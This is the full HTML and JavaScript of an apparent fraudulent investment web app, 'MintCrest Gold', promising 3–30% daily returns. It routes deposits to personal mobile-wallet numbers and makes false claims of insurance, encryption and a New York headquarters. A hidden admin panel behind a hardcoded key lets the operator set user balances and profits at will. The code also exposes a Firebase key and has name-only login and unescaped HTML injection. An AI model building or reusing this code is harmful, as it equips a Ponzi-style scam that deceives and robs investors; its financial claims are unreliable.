<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Secure Asset Management</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000205; color: white; overflow-x: hidden; user-select: none; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-marquee { display: inline-block; animation: marquee 20s linear infinite; white-space: nowrap; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .badge-pending { background: rgba(234, 179, 8, 0.15); color: #fbbf24; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
        .badge-approved { background: rgba(34, 197, 94, 0.15); color: #4ade80; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
        .badge-rejected { background: rgba(239, 68, 68, 0.15); color: #f87171; padding: 3px 8px; border-radius: 6px; font-size: 8px; font-weight: 800; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" target="_blank" class="fixed bottom-28 right-6 bg-green-500 p-4 rounded-full shadow-2xl z-[500] border-2 border-white/20 active:scale-90 transition-all">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-7 h-7" alt="WA">
    </a>

    <div class="bg-blue-900/40 border-b border-blue-500/20 py-2 overflow-hidden z-[500]">
        <div id="ticker-text" class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-300 italic">Initializing Secure Connection... MintCrest Gold Assets are 100% Insured... Daily Payouts are Processing.</div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000205] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-extrabold italic tracking-tighter mb-1 cursor-pointer">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[7px] uppercase tracking-[0.5em] mb-12 font-bold text-blue-400/60">EST. 2026 • NEW YORK • SECURE VAULT</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="LEGAL ACCOUNT NAME" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all uppercase text-[12px]">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-lg active:scale-95 transition-all">ACCESS PORTFOLIO</button>
            </div>
            <p class="mt-8 text-[7px] text-gray-600 font-bold uppercase tracking-widest">256-Bit SSL Encrypted Connection</p>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-40">
        
        <div id="p-home" class="page active-page p-6">
            <div class="mb-4 flex justify-between items-end px-2">
                <div>
                    <p class="text-[7px] font-black text-gray-500 uppercase tracking-widest">Portfolio Owner</p>
                    <h3 id="display-username" class="text-lg font-black italic text-blue-400 uppercase">GUEST</h3>
                </div>
                <div class="text-right">
                    <span class="bg-blue-500/10 text-blue-500 text-[6px] px-3 py-1 rounded-full border border-blue-500/20 font-black uppercase italic">VERIFIED</span>
                </div>
            </div>

            <div class="glass p-10 rounded-[3.5rem] mb-6 border-l-8 border-blue-600 shadow-xl">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest italic">Net Liquidity</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[10px] font-extrabold text-yellow-500 uppercase italic">NODE SYNCING...</div>
                <div class="mt-8 flex gap-3">
                    <div class="flex-1 bg-white/5 p-4 rounded-3xl border border-white/5">
                        <p class="text-[6px] text-gray-500 font-bold mb-1 uppercase">Total Profit</p>
                        <span class="text-[10px] text-green-400 font-black" id="v-profit">₨ 0</span>
                    </div>
                    <div class="flex-1 bg-white/5 p-4 rounded-3xl border border-white/5">
                        <p class="text-[6px] text-gray-500 font-bold mb-1 uppercase">Active Fleet</p>
                        <span id="tier-tag" class="text-[10px] text-blue-400 font-black italic">NONE</span>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 font-black text-[10px] uppercase italic border-b-2 border-blue-600">📥 Funding</button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 font-black text-[10px] uppercase italic border-b-2 border-red-600">📤 Payout</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-xl tracking-widest">Trading Fleets</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-20"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 text-xl tracking-widest">Activity Ledger</h2>
            <div id="user-history" class="space-y-3 pb-20"></div>
        </div>
        
        <div id="p-more" class="page p-6 space-y-6 pb-20">
            <div class="glass p-8 rounded-[3.5rem] border-t-4 border-yellow-500">
                <h3 class="text-yellow-500 font-black text-[10px] uppercase mb-4 text-center">🎁 Redeem Promo Code</h3>
                <input type="text" id="user-promo-input" placeholder="ENTER CODE" class="w-full bg-white/5 p-4 rounded-2xl text-center font-bold mb-4 outline-none uppercase text-[12px]">
                <button onclick="claimPromo()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase">Verify Code</button>
            </div>

            <div class="glass p-8 rounded-[3.5rem] space-y-4">
                <h3 class="text-blue-500 font-black text-[11px] uppercase tracking-widest border-b border-white/5 pb-2">🏢 About MintCrest Gold</h3>
                <p class="text-[10px] text-gray-400 leading-relaxed font-medium italic">
                    MintCrest Gold Global is a premier digital asset management firm. We utilize high-frequency gold trading and AI-driven arbitrage to generate consistent yields for our clients. <br><br>
                    <strong>HQ:</strong> 45 Rockefeller Plaza, Manhattan, NY 10111, USA.<br>
                    <strong>Global Reach:</strong> Dubai, London, New York.
                </p>

                <h3 class="text-green-500 font-black text-[11px] uppercase tracking-widest border-b border-white/5 pb-2 mt-6">🔐 Privacy & Security</h3>
                <p class="text-[10px] text-gray-400 leading-relaxed font-medium italic italic">
                    1. **Encryption:** All transactions are secured with AES-256 military-grade encryption.<br>
                    2. **Data Policy:** We do not share user data with third parties. Your portfolio identity is strictly confidential.<br>
                    3. **Asset Protection:** 100% of user capital is insured through our Liquidity Protection Fund (LPF).
                </p>

                <h3 class="text-red-400 font-black text-[11px] uppercase tracking-widest border-b border-white/5 pb-2 mt-6">⚖️ Terms of Service</h3>
                <p class="text-[10px] text-gray-400 leading-relaxed font-medium italic italic">
                    Withdrawals are processed within 2-24 hours. Multiple accounts per user are strictly prohibited and may lead to asset freezing. By using this vault, you agree to our global financial protocols.
                </p>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[3rem] text-[10px] font-black text-red-500 uppercase italic">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic italic tracking-widest">Asset Funding</h3>
                <div class="space-y-3 mb-8 text-[11px] font-black text-left">
                    <div class="glass p-5 rounded-2xl flex justify-between"><span>JAZZCASH</span><span>03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between"><span>EASYPAISA</span><span>03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (₨)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-black border border-white/5 outline-none text-lg">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold border border-white/5 outline-none uppercase">
                <input type="file" id="dep-proof" class="hidden">
                <button onclick="document.getElementById('dep-proof').click()" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[9px] font-black border-2 border-dashed border-white/10 uppercase italic">Upload Payment Proof</button>
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[11px] uppercase shadow-xl">Verify Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic tracking-widest">Authorize Payout</h3>
                <input type="number" id="wd-amt" placeholder="Min ₨ 100" class="w-full bg-white/5 p-6 rounded-2xl mb-4 text-center font-black border border-white/5 outline-none text-lg">
                <input type="text" id="wd-acc" placeholder="ACC NAME & NUMBER" class="w-full bg-white/5 p-6 rounded-2xl mb-8 text-center text-[10px] font-bold border border-white/5 outline-none uppercase">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[11px] uppercase shadow-xl">Request Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000205] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-2xl font-black text-blue-500 uppercase italic">Super Admin</h2>
            <button onclick="closeAdmin()" class="bg-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>

        <div class="glass p-6 rounded-[2.5rem] border-b-4 border-blue-600 mb-8">
            <h3 class="text-[10px] font-black uppercase mb-4 text-blue-400">Live Global Broadcast</h3>
            <textarea id="broadcast-input" placeholder="Type message..." class="w-full bg-white/5 p-4 rounded-xl text-[12px] outline-none border border-white/10 font-bold mb-4"></textarea>
            <button onclick="updateBroadcast()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-[10px] uppercase">Update Ticker</button>
        </div>

        <div id="adm-stats" class="grid grid-cols-3 gap-2 mb-8 text-center"></div>
        <div class="flex gap-2 mb-8">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 flex-1 py-4 rounded-2xl text-[10px] font-black uppercase italic">Logs</button>
            <button onclick="showAdmTab('users')" class="glass flex-1 py-4 rounded-2xl text-[10px] font-black uppercase italic">Users</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-4">
             <input type="text" id="user-search" onkeyup="filterUsers()" placeholder="Search Name..." class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[12px] border border-white/10 text-center uppercase">
             <div id="user-list-inner"></div>
        </div>

        <div class="glass p-10 rounded-[3.5rem] mt-10 border-t-2 border-green-500 shadow-2xl">
             <h3 class="text-[10px] font-black uppercase mb-6 text-center text-green-500">Master User Access</h3>
             <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center text-[12px] border border-white/10 uppercase">
             <input type="number" id="adm-val" placeholder="Value (₨ / %)" class="w-full bg-white/5 p-4 rounded-xl mb-6 text-center text-[12px] border border-white/10">
             
             <div class="grid grid-cols-2 gap-3 mb-3">
                 <button onclick="manualEdit('balance')" class="bg-blue-600 py-4 rounded-xl font-black text-[9px] uppercase">Set Balance</button>
                 <button onclick="manualEdit('profit')" class="bg-green-600 py-4 rounded-xl font-black text-[9px] uppercase">Set Profit</button>
             </div>
             <div class="grid grid-cols-2 gap-3">
                 <button onclick="manualEdit('activeTier')" class="bg-yellow-600 py-4 rounded-xl font-black text-[9px] uppercase">Set Plan Rs</button>
                 <button onclick="manualEdit('tierROI')" class="bg-purple-600 py-4 rounded-xl font-black text-[9px] uppercase">Set ROI %</button>
             </div>
             <input type="text" id="adm-tiername" placeholder="Custom Status Name" class="w-full bg-white/5 p-4 rounded-xl mt-6 text-center text-[9px] border border-white/10 uppercase">
             <button onclick="updateTierName()" class="w-full bg-white/10 py-4 rounded-xl font-black text-[9px] uppercase mt-3">Update Account Status</button>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab text-[9px] font-black">🏠<br>VAULT</button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1 text-[9px] font-black">📈<br>FLEETS</button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-1 text-[9px] font-black">📜<br>LEDGER</button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-1 text-[9px] font-black">🏢<br>FIRM</button>
    </nav>

    <script>
        // Updated Firebase Config
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 }, { n: "Micro-Elite III", p: 800, r: 3.4, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 1500, r: 3.8, d: 30 }, { n: "Bronze-VIP", p: 2000, r: 4, d: 30 },
            { n: "Silver-S", p: 3000, r: 4.2, d: 60 }, { n: "Silver-X", p: 4000, r: 4.5, d: 60 }, { n: "Silver-VIP", p: 5000, r: 4.8, d: 60 },
            { n: "Gold-S", p: 7000, r: 5, d: 60 }, { n: "Gold-X", p: 9000, r: 5.3, d: 60 }, { n: "Gold-Master", p: 15000, r: 6, d: 60 },
            { n: "Diamond-Lite", p: 20000, r: 7, d: 60 }, { n: "Diamond-Pro", p: 30000, r: 8.5, d: 60 }, { n: "Diamond-VIP", p: 50000, r: 10, d: 60 },
            { n: "Ruby-Expert", p: 75000, r: 12, d: 90 }, { n: "Sapphire-Elite", p: 100000, r: 15, d: 90 },
            { n: "Royal Crown I", p: 150000, r: 18, d: 90 }, { n: "Royal Crown II", p: 200000, r: 20, d: 90 }, { n: "Imperial King", p: 500000, r: 25, d: 120 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, d: 1, s: true }, { n: "⚡ FLASH 48H", p: 2000, r: 15, d: 2, s: true },
            { n: "👑 CROWN KING", p: 25000, r: 22, d: 7, s: true }, { n: "👑 EMPEROR", p: 100000, r: 30, d: 7, s: true },
            { n: "🎁 INVESTOR'S CHOICE", p: 100, r: 2.5, d: 15 }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); 
            db.collection("app_data").doc("broadcast").onSnapshot(doc => { if(doc.exists) document.getElementById('ticker-text').innerText = doc.data().message; });
        };

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            document.getElementById('display-username').innerText = name; renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { list.innerHTML += `<div class="glass p-6 rounded-[2rem] flex justify-between items-center border-l-4 border-blue-600 mb-3 text-[10px] font-black uppercase italic italic"><div>${d.type}<br><span class="opacity-30 text-[8px]">${new Date(d.time).toLocaleTimeString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { 
                const totalReturn = Math.floor((p.p * p.r / 100) * p.d);
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-6 rounded-[2.5rem] flex justify-between items-center active:scale-95 cursor-pointer mb-3 border border-white/5"><div><h4 class="font-black text-[12px] uppercase ${p.s ? 'text-blue-400' : ''}">${p.n}</h4><p class="text-[7px] text-gray-500 font-bold uppercase">${p.d} DAYS CONTRACT</p><p class="text-[9px] text-green-400 font-black uppercase mt-1 italic">${p.r}% Daily</p></div><div class="text-right"><div class="font-black text-lg tracking-tighter">₨ ${p.p.toLocaleString()}</div><div class="text-[7px] opacity-40 font-bold italic uppercase italic">Total: ₨ ${totalReturn.toLocaleString()}</div></div></div>`; 
            });
        }

        async function submitDeposit() { const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof'); if(!a || !t || !f.files[0]) return alert("Missing Info!"); const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => { await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now() }); alert("Deposit Sent!"); changePage('activity'); }; }
        async function submitWithdraw() { const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a || parseInt(a) < 100) return alert("Min Rs 100"); if(parseInt(a) > user.balance) return alert("Low Balance"); await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() }); await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Payout Requested!"); changePage('activity'); }
        async function buy(p, roi, tName) { if(user.balance < p) { alert("Insufficient Assets!"); changePage('wallet'); } else { if(confirm("Activate "+tName+"?")) { await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); alert("Fleet Operational!"); changePage('activity'); } } }
        async function claimPromo() { const c = document.getElementById('user-promo-input').value; if(!c) return; await db.collection("requests").add({ user: user.name, type: "Promo Claim", promo: c, status: "pending", time: Date.now(), amount: 0 }); alert("Verification Sent!"); document.getElementById('user-promo-input').value = ''; }
        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}H ${m}M ${s}S`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("ACCESS KEY:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }

        async function updateBroadcast() { const msg = document.getElementById('broadcast-input').value; if(!msg) return; await db.collection("app_data").doc("broadcast").set({ message: msg }); alert("Live Update Sent!"); }
        async function updateTierName() { const u = document.getElementById('adm-user').value.toUpperCase().trim(); const n = document.getElementById('adm-tiername').value.toUpperCase().trim(); if(!u || !n) return; await db.collection("users").doc(u).update({ tierName: n }); alert("Status Updated!"); }
        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-blue-600 px-3 py-1 rounded text-[8px] font-black">📸 PROOF</button>` : '';
                    list.innerHTML += `<div class="glass p-5 rounded-2xl flex justify-between items-center text-[9px] font-black uppercase mb-3 border-l-4 border-blue-500"><div>${d.user}<br>${d.type}<br>Rs ${d.amount}</div><div class="flex gap-2">${pBtn}<button onclick="handleReq('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-1 rounded">YES</button><button onclick="handleReq('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-600 px-3 py-1 rounded">NO</button></div></div>`;
                });
            });
            db.collection("users").onSnapshot(snap => {
                const inner = document.getElementById('user-list-inner'); inner.innerHTML = '';
                let totalBal = 0; snap.forEach(doc => { totalBal += (doc.data().balance || 0); });
                document.getElementById('adm-stats').innerHTML = `<div class="glass p-4 rounded-2xl"><p class="text-[7px] opacity-50 uppercase">USERS</p><p class="text-[12px] font-black">${snap.size}</p></div><div class="glass p-4 rounded-2xl"><p class="text-[7px] opacity-50 uppercase">ASSETS</p><p class="text-[12px] font-black">₨ ${totalBal}</p></div><div class="glass p-4 rounded-2xl"><p class="text-[7px] opacity-50 uppercase">STATUS</p><p class="text-[12px] font-black italic text-green-400">LIVE</p></div>`;
                snap.forEach(doc => { const u = doc.data(); inner.innerHTML += `<div class="user-card glass p-5 rounded-2xl mb-3 flex justify-between items-center text-[9px] font-black uppercase" data-name="${u.name}"><div>${u.name}</div><div>Rs ${u.balance}<br>${u.tierROI}% ROI</div></div>`; });
            });
        }
        async function handleReq(id, uName, baseAmt, act, type) {
            if(act === 'rejected') { await db.collection("requests").doc(id).update({ status: 'rejected' }); return; }
            const ref = db.collection("users").doc(uName); const doc = await ref.get(); let finalAmt = baseAmt;
            if(type === "Promo Claim") { finalAmt = parseInt(prompt("Assign Bonus Rs:", "100")); if(isNaN(finalAmt)) return; await db.collection("requests").doc(id).update({ amount: finalAmt }); }
            if(['deposit', 'Daily Profit Yield', 'Promo Claim'].includes(type)) { await ref.update({ balance: (doc.data().balance||0)+finalAmt }); }
            await db.collection("requests").doc(id).update({ status: 'approved' });
        }
        function filterUsers() { const term = document.getElementById('user-search').value.toLowerCase(); document.querySelectorAll('.user-card').forEach(c => c.style.display = c.getAttribute('data-name').toLowerCase().includes(term) ? 'flex' : 'none'); }
        async function manualEdit(f) { const u = document.getElementById('adm-user').value.toUpperCase().trim(); const v = parseFloat(document.getElementById('adm-val').value); if(!u || isNaN(v)) return; const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: v }); alert("Asset Adjusted!"); }
    </script>
</body>
</html>
